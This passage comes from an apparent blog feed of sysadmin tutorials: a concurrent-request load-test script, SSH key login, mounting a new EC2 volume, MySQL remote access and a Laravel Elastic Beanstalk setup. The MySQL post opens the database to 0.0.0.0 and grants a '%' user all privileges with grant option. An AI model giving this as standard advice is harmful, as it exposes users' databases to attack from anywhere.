class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Then create a function to perform http requests</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_test</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># define a base url</span></span><br><span class="line">    base_url = <span class="string">&#x27;http://example.com&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Assumed that your web application need to login</span></span><br><span class="line">    url = base_url + <span class="string">&#x27;/auth/login&#x27;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, data=payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we need the session cookie</span></span><br><span class="line">    cookies = res.cookies</span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate sales report</span></span><br><span class="line">    url = base_url + <span class="string">&#x27;/reports/sales&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># need to pass the cookies in order to tell the server that I&#x27;m &quot;that&quot; person</span></span><br><span class="line">    <span class="comment"># this is GET request, because need to get the CSRF token before can do a POST</span></span><br><span class="line">    res = requests.get(url, cookies=cookies)</span><br><span class="line">    html = res.text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># the &quot;pattern&quot; is depends on how you construct your html page</span></span><br><span class="line">    pattern = <span class="string">&#x27;name=&quot;csrf-token&quot; content=&quot;(\w+)&quot;&#x27;</span></span><br><span class="line">    matches = re.findall(pattern, html)</span><br><span class="line">    token = matches[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># POST to generate sales report</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;2016-06-27&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_token&#x27;</span>: token,</span><br><span class="line">        <span class="string">&#x27;sales_id&#x27;</span>: random.randint(<span class="number">1</span>, <span class="number">30</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, cookies=cookies, data=payload)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><em>If you don’t understand why need the cookie, you can refer <a href="/blog/2016/03/29/session-hijacking-facebook-dot-com-example/">Session hijacking: facebook.com example</a>.</em></p><p>Note that the above function <code>http_test()</code> actually perform <strong>POST login</strong>, <strong>GET sales report</strong>, <strong>POST sales report</strong></p><p>Now in your <code>main</code> function, replace <code># http requests goes here</code> with <code>http_test()</code></p><p>Make the python script executable</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> +x http_requests.py</span></span><br></pre></td></tr></table></figure><p>if you run this script, means 1 client with 20 <em>(for loop)</em> x 3 requests, which equals to 60 requests one after one.</p><p>What if want to make it 100 concurrent connections?</p><p>Simply create another shell script, let’s name it <strong>run.sh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..100&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Requests (<span class="variable">$i</span>) begin&quot;</span></span><br><span class="line">    ./http_requests.py &amp;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>also make it executable</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> +x run.sh</span></span><br></pre></td></tr></table></figure><p>Then run it</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./run.sh</span></span><br></pre></td></tr></table></figure><p>Now you can simulate 100 concurrent connections with each 60 requests.</p><p>You can download the scripts here:</p><ul><li><a href="/attachments/posts/2016-06-29-python-script-to-simulate-multiple-concurrent-requests-to-web-application/run.sh">run.sh</a></li><li><a href="/attachments/posts/2016-06-29-python-script-to-simulate-multiple-concurrent-requests-to-web-application/http_requests.py">http_requests.py</a></li></ul><p>References:</p><ul><li><a href="http://stackoverflow.com/questions/5238103/how-to-start-multiple-processes-in-bash/5238146#5238146">How to start multiple processes in Bash</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I first created this script to heavy test the web application hosted in elastic beanstalk.&lt;/p&gt;
&lt;p&gt;Why &lt;strong&gt;python&lt;/strong&gt;? Just for</summary>
        
      
    
    
    
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
    <category term="webapp" scheme="http://jslim.net/tags/webapp/"/>
    
  </entry>
  
  <entry>
    <title>Enable ssh login without password</title>
    <link href="http://jslim.net/blog/2016/06/29/enable-ssh-login-without-password/"/>
    <id>http://jslim.net/blog/2016/06/29/enable-ssh-login-without-password/</id>
    <published>2016-06-29T00:52:25.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h3 id="In-client-PC"><a href="#In-client-PC" class="headerlink" title="In client PC"></a>In client PC</h3><p>Generate ssh key if you don’t have one</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -<span class="keyword">b</span> <span class="number">4096</span> -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure><p>Then copy <em>(to clipboard)</em> the public key <em>(with the extension <code>.pub</code>)</em>, e.g.</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pbcopy &lt; ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br></pre></td></tr></table></figure><h3 id="In-server"><a href="#In-server" class="headerlink" title="In server"></a>In server</h3><p>Add the public key to <strong>~/.ssh/authorized_keys</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim ~<span class="regexp">/.ssh/</span>authorized_keys</span><br></pre></td></tr></table></figure><p>Then paste the public key to next line of this file, save it</p><h3 id="Test-it"><a href="#Test-it" class="headerlink" title="Test it"></a>Test it</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh -i ~<span class="regexp">/.ssh/id</span>_rsa user<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p>You should be able to login without prompt you to input password</p><p>References:</p><ul><li><a href="https://help.github.com/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent/">Generating a new SSH key and adding it to the ssh-agent</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h3 id=&quot;In-client-PC&quot;&gt;&lt;a href=&quot;#In-client-PC&quot; class=&quot;headerlink&quot; title=&quot;In client PC&quot;&gt;&lt;/a&gt;In client PC&lt;/h3&gt;&lt;p&gt;Generate ssh key if you don’t</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="ssh" scheme="http://jslim.net/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>AWS extend disk volume on an EC2 instance</title>
    <link href="http://jslim.net/blog/2016/06/14/aws-extend-disk-volume-on-an-ec2-instance/"/>
    <id>http://jslim.net/blog/2016/06/14/aws-extend-disk-volume-on-an-ec2-instance/</id>
    <published>2016-06-14T23:25:36.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>There may have certain situation that we need to extend disk volume on an instance.</p><h2 id="Create-a-new-volumn-on-AWS"><a href="#Create-a-new-volumn-on-AWS" class="headerlink" title="Create a new volumn on AWS"></a>Create a new volumn on AWS</h2><p>Visit <strong>EC2</strong> service, and click on the <strong>Volumes</strong> on the left menu. Then create volume</p><p><img src="/images/posts/2016-06-15-aws-extend-disk-volume-on-an-ec2-instance/create-volume.png" alt="EC2 instance list"></p><ul><li><strong>Volume Type:</strong> for normal case, just select <code>General Purpose SSD</code>, unless you have a high-write usage, then you can choose <code>Provisioned IOPS SSD</code></li><li><strong>Size (GiB):</strong> Just put the size you need</li><li><strong>Availability Zone:</strong> Make sure you select the zone that same as the instance you want to extend</li><li><strong>Snapshot ID:</strong> Leave it</li><li><strong>Encryption:</strong> Leave it</li></ul><p>Then create</p><p><img src="/images/posts/2016-06-15-aws-extend-disk-volume-on-an-ec2-instance/attach-volume.png" alt="EC2 instance list"></p><p>Now you can see that the <strong>Status</strong> is <code>available</code>. Right-click the row, and click on <strong>Attach Volume</strong></p><p><img src="/images/posts/2016-06-15-aws-extend-disk-volume-on-an-ec2-instance/attach-volume-select-instance.png" alt="EC2 instance list"></p><p>Select the instance you want to extend</p><p><img src="/images/posts/2016-06-15-aws-extend-disk-volume-on-an-ec2-instance/attach-volume-select-instance-2.png" alt="EC2 instance list"></p><p>This one just leave it, and <strong>Attach</strong> it.</p><h2 id="Server-config"><a href="#Server-config" class="headerlink" title="Server config"></a>Server config</h2><p>Now ssh into the instance</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-xxx<span class="number">-31</span>-xx-xx:~$ df -h</span><br><span class="line"></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            <span class="number">492</span>M   <span class="number">12</span>K  <span class="number">492</span>M   <span class="number">1</span>% /dev</span><br><span class="line">tmpfs           <span class="number">100</span>M  <span class="number">344</span>K   <span class="number">99</span>M   <span class="number">1</span>% /run</span><br><span class="line">/dev/xvda1      <span class="number">7.8</span>G  <span class="number">1.6</span>G  <span class="number">5.8</span>G  <span class="number">22</span>% /</span><br><span class="line"><span class="built_in">none</span>            <span class="number">4.0</span>K     <span class="number">0</span>  <span class="number">4.0</span>K   <span class="number">0</span>% <span class="regexp">/sys/</span>fs/cgroup</span><br><span class="line"><span class="built_in">none</span>            <span class="number">5.0</span>M     <span class="number">0</span>  <span class="number">5.0</span>M   <span class="number">0</span>% <span class="regexp">/run/</span>lock</span><br><span class="line"><span class="built_in">none</span>            <span class="number">497</span>M     <span class="number">0</span>  <span class="number">497</span>M   <span class="number">0</span>% <span class="regexp">/run/</span>shm</span><br><span class="line"><span class="built_in">none</span>            <span class="number">100</span>M     <span class="number">0</span>  <span class="number">100</span>M   <span class="number">0</span>% <span class="regexp">/run/u</span>ser</span><br></pre></td></tr></table></figure><p>The volume not mounted yet, so cannot see here</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-xxx-31-xx-xx:~$ sudo fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/xvda:<span class="number"> 8589 </span>MB,<span class="number"> 8589934592 </span>bytes</span><br><span class="line">255 heads,<span class="number"> 63 </span>sectors/track,<span class="number"> 1044 </span>cylinders, total<span class="number"> 16777216 </span>sectors</span><br><span class="line">Units = sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">    Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/xvda1   *      <span class="number"> 16065 </span>  <span class="number"> 16771859 </span>    8377897+ <span class="number"> 83 </span> Linux</span><br><span class="line"></span><br><span class="line">Disk /dev/xvdf: 21.5 GB,<span class="number"> 21474836480 </span>bytes          &lt;----------------- NEW DISK</span><br><span class="line">255 heads,<span class="number"> 63 </span>sectors/track,<span class="number"> 2610 </span>cylinders, total<span class="number"> 41943040 </span>sectors</span><br><span class="line">Units = sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">Disk /dev/xvdf doesn&#x27;t contain a valid partition table</span><br></pre></td></tr></table></figure><p>Now need to format it to <strong><a href="https://en.wikipedia.org/wiki/Ext4">ext4</a></strong> filesystem</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ubuntu</span>@ip-xxx-<span class="number">31</span>-xx-xx:~$ sudo mkfs -t ext4 /dev/xvdf</span><br><span class="line"><span class="attribute">mke2fs</span> <span class="number">1</span>.<span class="number">42</span>.<span class="number">9</span> (<span class="number">4</span>-Feb-<span class="number">2014</span>)</span><br><span class="line"><span class="attribute">Filesystem</span> label=</span><br><span class="line"><span class="attribute">OS</span> type: Linux</span><br><span class="line"><span class="attribute">Block</span> size=<span class="number">4096</span> (log=<span class="number">2</span>)</span><br><span class="line"><span class="attribute">Fragment</span> size=<span class="number">4096</span> (log=<span class="number">2</span>)</span><br><span class="line"><span class="attribute">Stride</span>=<span class="number">0</span> blocks, Stripe width=<span class="number">0</span> blocks</span><br><span class="line"><span class="attribute">1310720</span> inodes, <span class="number">5242880</span> blocks</span><br><span class="line"><span class="attribute">262144</span> blocks (<span class="number">5</span>.<span class="number">00</span>%) reserved for the super user</span><br><span class="line"><span class="attribute">First</span> data block=<span class="number">0</span></span><br><span class="line"><span class="attribute">Maximum</span> filesystem blocks=<span class="number">4294967296</span></span><br><span class="line"><span class="attribute">160</span> block groups</span><br><span class="line"><span class="attribute">32768</span> blocks per group, <span class="number">32768</span> fragments per group</span><br><span class="line"><span class="attribute">8192</span> inodes per group</span><br><span class="line"><span class="attribute">Superblock</span> backups stored <span class="literal">on</span> blocks: </span><br><span class="line">    <span class="attribute">32768</span>, <span class="number">98304</span>, <span class="number">163840</span>, <span class="number">229376</span>, <span class="number">294912</span>, <span class="number">819200</span>, <span class="number">884736</span>, <span class="number">1605632</span>, <span class="number">2654208</span>, </span><br><span class="line">    <span class="attribute">4096000</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Allocating</span> group tables: done                            </span><br><span class="line"><span class="attribute">Writing</span> inode tables: done                            </span><br><span class="line"><span class="attribute">Creating</span> journal (<span class="number">32768</span> blocks): done</span><br><span class="line"><span class="attribute">Writing</span> superblocks and filesystem accounting information: done   </span><br></pre></td></tr></table></figure><p>Last is to mount it to <strong>/storage</strong> <em>(it can be any path you like)</em></p><p>Edit the file <strong>/etc/fstab</strong> <em>(you may use <strong>nano</strong> if you’re not familiar with <strong>vim</strong>)</em></p><p>Remember to backup before edit the file</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-xxx-<span class="number">31</span>-xx-xx:$ sudo cp <span class="regexp">/etc/</span>fstab <span class="regexp">/etc/</span>fstab.orig</span><br><span class="line">ubuntu@ip-xxx-<span class="number">31</span>-xx-xx:$ sudo vim <span class="regexp">/etc/</span>fstab</span><br></pre></td></tr></table></figure><p>Update the content</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LABEL=cloudimg-rootfs   /         ext4   defaults,discard        <span class="number">0</span> <span class="number">0</span>   &lt;------ <span class="keyword">THIS</span> IS THE <span class="keyword">DEFAULT</span> LINE</span><br><span class="line"><span class="regexp">/dev/</span>xvdf               /storage  ext4   defaults                <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>Now create a folder for that new disk volume</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-xxx-31-xx-xx:$ sudo <span class="built_in">mkdir</span> /storage</span><br></pre></td></tr></table></figure><p>Then mount all</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu<span class="variable">@ip</span>-xxx-<span class="number">31</span>-xx-<span class="symbol">xx:</span><span class="variable">$ </span>sudo mount -a</span><br></pre></td></tr></table></figure><p>Double check it</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-xxx-<span class="number">31</span>-xx-xx:$ df -h</span><br><span class="line">Filesystem      <span class="keyword">Size</span>  Used Avail Use% Mounted on</span><br><span class="line">udev            <span class="number">492</span>M   <span class="number">12</span>K  <span class="number">492</span>M   <span class="number">1</span>% /dev</span><br><span class="line">tmpfs           <span class="number">100</span>M  <span class="number">344</span>K   <span class="number">99</span>M   <span class="number">1</span>% /run</span><br><span class="line"><span class="regexp">/dev/</span>xvda1      <span class="number">7.8</span>G  <span class="number">1.6</span>G  <span class="number">5.8</span>G  <span class="number">22</span>% /</span><br><span class="line">none            <span class="number">4.0</span>K     <span class="number">0</span>  <span class="number">4.0</span>K   <span class="number">0</span>% <span class="regexp">/sys/</span>fs/cgroup</span><br><span class="line">none            <span class="number">5.0</span>M     <span class="number">0</span>  <span class="number">5.0</span>M   <span class="number">0</span>% <span class="regexp">/run/</span>lock</span><br><span class="line">none            <span class="number">497</span>M     <span class="number">0</span>  <span class="number">497</span>M   <span class="number">0</span>% <span class="regexp">/run/</span>shm</span><br><span class="line">none            <span class="number">100</span>M     <span class="number">0</span>  <span class="number">100</span>M   <span class="number">0</span>% <span class="regexp">/run/u</span>ser</span><br><span class="line"><span class="regexp">/dev/</span>xvdf        <span class="number">20</span>G   <span class="number">44</span>M   <span class="number">19</span>G   <span class="number">1</span>% /storage   &lt;------- <span class="keyword">THIS</span> IS <span class="keyword">NEW</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;There may have certain situation that we need to extend disk volume on an instance.&lt;/p&gt;
&lt;h2 id=&quot;Create-a-new-volumn-on-AWS&quot;&gt;&lt;a</summary>
        
      
    
    
    
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title>AWS EC2 - Enable remote access on mysql</title>
    <link href="http://jslim.net/blog/2016/06/05/aws-ec2-enable-remote-access-on-mysql/"/>
    <id>http://jslim.net/blog/2016/06/05/aws-ec2-enable-remote-access-on-mysql/</id>
    <published>2016-06-05T20:33:00.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I think most of us know that enable remote access, need to create a new user with <code>%</code> host.</p><p>But in EC2, there are some security config need to be done.</p><h3 id="Update-the-security-group-of-the-EC2-instance"><a href="#Update-the-security-group-of-the-EC2-instance" class="headerlink" title="Update the security group of the EC2 instance"></a>Update the security group of the EC2 instance</h3><p><img src="/images/posts/2016-06-06-aws-ec2-enable-remote-access-on-mysql/instance-list.png" alt="EC2 instance list"></p><p>Go to your AWS console, select the instance where you host your database <em>(MySQL)</em>.</p><p><img src="/images/posts/2016-06-06-aws-ec2-enable-remote-access-on-mysql/security-group-inbound-list.png" alt="EC2 security group"></p><p>Then select the security group</p><p><img src="/images/posts/2016-06-06-aws-ec2-enable-remote-access-on-mysql/security-group-add-rule.png" alt="EC2 security group add rule"></p><p>Make sure you add a rule in the <strong>In bound</strong> there, for MySQL, and set the IP to <code>0.0.0.0</code></p><h3 id="Update-the-mysql-binding-address"><a href="#Update-the-mysql-binding-address" class="headerlink" title="Update the mysql binding address"></a>Update the mysql binding address</h3><p>Edit the file <code>/etc/mysql/my.cnf</code>, and change the binding address to <code>0.0.0.0</code></p><p><em>(EDIT: 2019-04-04, you may also update the file <code>/etc/mysql/conf.d/mysql.cnf</code><br>, for newer version of MySQL. Thanks for Dawood pointing out.)</em></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bind-address</span> <span class="operator">=</span> <span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure><p>then restart mysql server</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="regexp">/etc/i</span>nit.d/mysql restart</span><br></pre></td></tr></table></figure><h3 id="Create-a-new-user-for-any-host-in-MySQL"><a href="#Create-a-new-user-for-any-host-in-MySQL" class="headerlink" title="Create a new user for any host in MySQL"></a>Create a new user for any host in MySQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#x27;foo&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;your-awesome-pass&#x27;;</span><br><span class="line"></span><br><span class="line"># grant privileges to table(s)</span><br><span class="line">GRANT ALL PRIVILEGES ON db_name.* TO &#x27;foo&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><p><strong>NOTE: bare in mind that <code>&#39;foo&#39;@&#39;localhost&#39;</code> &amp; <code>&#39;foo&#39;@&#39;%&#39;</code> are consider as different user, you may have 2 different passwords for each of them</strong></p><p>References:</p><ul><li><a href="http://stackoverflow.com/questions/9766014/connect-to-mysql-on-amazon-ec2-from-a-remote-server/9983461#9983461">Connect to mysql on Amazon EC2 from a remote server</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I think most of us know that enable remote access, need to create a new user with &lt;code&gt;%&lt;/code&gt; host.&lt;/p&gt;
&lt;p&gt;But in EC2, there are some</summary>
        
      
    
    
    
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title>Setup Laravel 5 in Amazon Elastic Beanstalk</title>
    <link href="http://jslim.net/blog/2016/05/23/setup-laravel-5-in-amazon-elastic-beanstalk/"/>
    <id>http://jslim.net/blog/2016/05/23/setup-laravel-5-in-amazon-elastic-beanstalk/</id>
    <published>2016-05-23T23:42:55.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>This is my first time dealing with AWS. Initially, I setup my Laravel project in a normal EC2 instance, and manually install mysql, web server, etc.</p><p>Then a friend of mine told me that this kind of infrastructure is not scalable. Eventually I go for Elastic Beanstalk.</p><h2 id="Create-an-AWS-account"><a href="#Create-an-AWS-account" class="headerlink" title="Create an AWS account"></a>Create an <a href="https://aws.amazon.com/">AWS account</a></h2><p>You need a valid credit card to perform this action. Just follow the instruction will do.</p><h2 id="Create-a-new-app-in-Elastic-Beanstalk"><a href="#Create-a-new-app-in-Elastic-Beanstalk" class="headerlink" title="Create a new app in Elastic Beanstalk"></a>Create a new app in Elastic Beanstalk</h2><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/aws-services-eb.png" alt="AWS services"></p><p>Then choose <strong>Web server environment</strong>.</p><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/eb-environment.png" alt="AWS Elastic Beanstalk environment"></p><p>Platform select <code>PHP</code>.</p><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/eb-environment-config.png" alt="AWS Elastic Beanstalk - environment config"></p><p>You can temporary choose <strong>Sample application</strong> first.</p><p><em>Or you can use command line to create (<a href="http://docs.aws.amazon.com/elasticbeanstalk/latest/dg/eb3-create.html">see here</a>)</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd <span class="regexp">/path/</span>to<span class="regexp">/project/</span></span><br><span class="line">$ eb create &lt;environment&gt; -t webapp</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/eb-environment-overview.png" alt="AWS Elastic Beanstalk - overview"></p><p>Now you can click on the link above to see your sample page</p><h2 id="Install-eb-in-your-local"><a href="#Install-eb-in-your-local" class="headerlink" title="Install eb in your local"></a>Install <code>eb</code> in your local</h2><p><a href="https://docs.aws.amazon.com/console/elasticbeanstalk/eb-cli-install">Follow the instruction here</a></p><p>Once you have installed. Run the following command</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>eb init</span><br></pre></td></tr></table></figure><p>You will be prompted to key in AWS credential. <a href="http://docs.aws.amazon.com/general/latest/gr/getting-aws-sec-creds.html">Refer the instruction here</a></p><h3 id="Enable-ssh-login"><a href="#Enable-ssh-login" class="headerlink" title="Enable ssh login"></a>Enable ssh login</h3><p>Go to <strong>Configuration</strong> on your left side, then select <strong>Instances</strong></p><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/choose-your-ssh-key.png" alt="AWS Elastic Beanstalk - ssh login"></p><p>If you don’t have a key, create it. Download it and put into your <code>~/.ssh/</code> directory.</p><p><em>NOTE: Bare in mind that whenever you ssh in and change something, the changes only temporary, once it scale up and down the changes will be lost</em></p><h3 id="Add-environment-variables"><a href="#Add-environment-variables" class="headerlink" title="Add environment variables"></a>Add environment variables</h3><p>If you notice, there is a file named <strong>.env.sample</strong> in all laravel project, and you need to rename/copy it as <strong>.env</strong> <em>(without <strong>sample</strong>)</em>, this is because the configuration cannot be push to git repo, due to security reason.</p><p>Now, in elasticbeanstalk, if you ssh in and rename it to <strong>.env</strong>, then when it scale up and down, the <strong>.env</strong> will be lost, and the site may be down. Thus, the you have to add the config settings to environment variables</p><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/eb-environment-software-config.png" alt="AWS Elastic Beanstalk - software configuration"></p><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/eb-env-variable.png" alt="AWS Elastic Beanstalk - environment variables"></p><h2 id="Configure-RDS-for-your-project"><a href="#Configure-RDS-for-your-project" class="headerlink" title="Configure RDS for your project"></a>Configure RDS for your project</h2><p>Go to <strong>Services</strong> <em>(in the top left)</em>, and choose <code>RDS</code>, then follow the instruction.</p><p>Now go to your instances</p><p><img src="/images/posts/2016-05-24-setup-laravel-5-in-amazon-elastic-beanstalk/rds-instances.png" alt="AWS Elastic Beanstalk - RDS instances"></p><p>Get the link and put it in your environment variable.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span 